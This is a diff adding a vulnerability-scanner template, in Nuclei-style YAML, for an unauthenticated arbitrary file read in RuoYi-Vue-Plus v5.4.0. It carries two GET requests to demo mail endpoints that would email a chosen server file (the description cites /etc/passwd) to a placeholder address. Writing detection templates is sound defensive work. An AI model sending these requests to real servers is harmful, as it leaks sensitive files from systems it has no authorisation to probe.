@@ -1,0 +1,29 @@
+id: ruoyi-vue-plus-arbitrary-file-read
+
+info:
+  name: RuoYi-Vue-Plus 任意文件读取漏洞
+  author: onewin
+  severity: high
+  description: |
+    RuoYi-Vue-Plus 邮件功能存在未授权任意文件读取漏洞，攻击者可通过构造恶意请求读取服务器敏感文件（如 `/etc/passwd`）。
+    影响版本：v5.4.0
+    [漏洞发现时间：2025年6月]
+  reference:
+    - https://github.com/dromara/RuoYi-Vue-Plus
+    - https://github.com/ShenxiuSec/cve-proofs/blob/573f55f4472bd3cfa71f7153a98fbe7261447df6/POC-20250620-01/report.md
+  tags: RuoYi-Vue-Plus后台管理系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/demo/mail/sendMessageWithAttachment?to=xxxxxx@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/path/to/secret"
+      - "{{BaseURL}}/demo/mail/sendMessageWithAttachments?to=xxxxxx@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/path/to/secret"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "操作成功"
+        part: body
+      - type: status
+        status:
+          - 200
